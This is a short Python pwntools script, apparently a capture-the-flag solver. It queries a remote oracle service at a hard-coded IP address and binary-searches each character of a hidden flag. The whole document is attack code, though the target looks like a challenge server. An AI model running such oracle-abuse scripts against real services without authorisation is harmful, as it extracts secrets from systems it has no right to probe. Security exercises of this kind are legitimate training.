from pwn import *

# Connection details from your terminal
host = '66.228.49.41'
port = 1337

def get_oracle_response(index, guess):
    io = remote(host, port, level='error')
    io.recvuntil('> ')
    # Send the direct call payload
    io.sendline('Q({}, {})'.format(index, guess))
    try:
        res = io.recvline().strip()
        io.close()
        return int(res)
    except:
        io.close()
        return None

flag = ""
# Based on L() returning 28, the flag might be around 28-30 chars
for i in range(40): 
    low = 65   # Printable ASCII start
    high = 126 # Printable ASCII end
    char_found = False
    
    while low <= high:
        mid = (low + high) // 2
        result = get_oracle_response(i, mid)
        
        if result == 0:
            flag += chr(mid)
            print(f"[*] Found char at index {i}: {chr(mid)} | Current flag: {flag}")
            char_found = True
            break
        elif result == -1:
            # If -1 means 'less than', the real char is higher
            low = mid + 1
        else:
            # If 1 means 'greater than', the real char is lower
            high = mid - 1
            
    if not char_found:
        print(f"[-] Could not find char at index {i}. Ending.")
        break

print(f"[!] Final Flag: {flag}")

